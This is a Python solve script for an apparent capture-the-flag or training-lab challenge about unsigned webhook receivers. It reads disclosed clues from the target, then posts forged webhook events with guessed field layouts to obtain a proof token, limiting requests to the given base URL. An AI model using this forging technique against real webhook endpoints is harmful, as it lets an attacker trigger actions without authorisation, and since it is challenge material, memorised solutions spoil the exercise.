#!/usr/bin/env python3
"""Trust the Webhook (day-26, curriculum day 19) - unsigned/forged webhook event
trust.

New bug class (not yet in recovery_lib.py). The Starlette app discloses, via
`/api/clues`, a `feature_route` plus the exact `event_type` and `owner_scope`
an incoming webhook event needs to claim. The feature route is a webhook
receiver that accepts a POST with no signature/HMAC/auth check at all - it
just trusts whatever JSON event the caller claims to be.

Narrowed by probing field-layout variants directly (binary-searched the
field names/values against a live time_trial target, see NOTES.md): the
receiver wants *exactly* `{"event": <event_type>, "owner": <owner_scope>}` -
two bare keys named literally `event`/`owner` (NOT the clue's own key names
`event_type`/`owner_scope`, NOT `type`/`scope`), both required, both values
matched exactly. Nesting under `data`/`payload` is unnecessary. A maximal
alias superset (every alias name at the top level at once) also works as a
fallback in case a future variant uses a different bare key pair.

Generic: feature_route, event_type and owner_scope are all read live from
`/api/clues` - nothing here is hard-coded per attempt.

Usage: solve.py <target_base_url> [evidence_dir]
Prints the recovered proof_<hex> to stdout (nothing else on success).
"""
import json
import re
import sys
import time
import http.cookiejar
import urllib.error
import urllib.request
from pathlib import Path

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
TIMEOUT = 30
DELAY = 0.5
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


class Target:
    def __init__(self, base, evidence_dir=None):
        self.base = base.rstrip("/")
        self.ev = Path(evidence_dir) if evidence_dir else None
        if self.ev:
            self.ev.mkdir(parents=True, exist_ok=True)
        self._n = 0
        self.op = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    def _save(self, name, status, body):
        if self.ev and name:
            (self.ev / f"{name}.meta.json").write_text(json.dumps({"status": status}, indent=2))
            (self.ev / f"{name}.body").write_text(body)

    def request(self, path, method="GET", data=None, headers=None, save=None):
        if self._n:
            time.sleep(DELAY)
        self._n += 1
        url = path if path.startswith("http") else self.base + path
        if not url.startswith(self.base):
            raise ValueError(f"out-of-scope URL refused: {url}")
        hdrs = {"User-Agent": UA}
        body = None
        if data is not None:
            body = json.dumps(data).encode()
            hdrs["Content-Type"] = "application/json"
        hdrs.update(headers or {})
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        try:
            with self.op.open(req, timeout=TIMEOUT) as r:
                status, text = r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            status, text = e.code, e.read().decode("utf-8", "replace")
        self._save(save, status, text)
        return status, text

    def get_json(self, path, save=None):
        st, body = self.request(path, save=save)
        try:
            return st, json.loads(body)
        except ValueError:
            return st, None

    def post_json(self, path, payload, save=None):
        st, body = self.request(path, "POST", data=payload, save=save)
        try:
            return st, json.loads(body)
        except ValueError:
            return st, body


def _candidate_bodies(event_type, owner_scope):
    """Field-layout candidates, confirmed-minimal first.

    Binary-searched against a live target: the receiver wants exactly
    `{"event": event_type, "owner": owner_scope}` - those two bare key names,
    both required, both values exact (see NOTES.md for the full probe
    matrix). A maximal alias superset is kept as a fallback only, in case a
    future variant expects a different bare key pair."""
    yield {"event": event_type, "owner": owner_scope}
    yield {
        "event": event_type, "type": event_type, "event_type": event_type,
        "owner_scope": owner_scope, "scope": owner_scope, "owner": owner_scope,
    }


def rec_forged_webhook_event(t, clues):
    """POST a forged webhook event matching the disclosed event_type/owner_scope
    to feature_route with no signature; extract proof_<hex> from the response."""
    feature = clues.get("feature_route")
    event_type = clues.get("event_type")
    owner_scope = clues.get("owner_scope")
    if not feature or not event_type or not owner_scope:
        return None, None
    for i, body in enumerate(_candidate_bodies(event_type, owner_scope)):
        st, resp = t.post_json(feature, body, save=f"forge_{i}")
        text = resp if isinstance(resp, str) else json.dumps(resp)
        m = PROOF_RE.search(text)
        if m:
            return m.group(0), body
    return None, None


def solve(base, evidence_dir=None):
    t = Target(base, evidence_dir)
    t.request("/", save="root")
    st, clues = t.get_json("/api/clues", save="clues")
    if st != 200 or not isinstance(clues, dict):
        raise SystemExit(f"/api/clues -> {st}; cannot classify")
    proof, body = rec_forged_webhook_event(t, clues)
    if not proof:
        raise SystemExit("no proof recovered (candidate body list exhausted)")
    return proof


if __name__ == "__main__":
    if len(sys.argv) < 2:
        raise SystemExit("usage: solve.py <target_base_url> [evidence_dir]")
    print(solve(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else None))
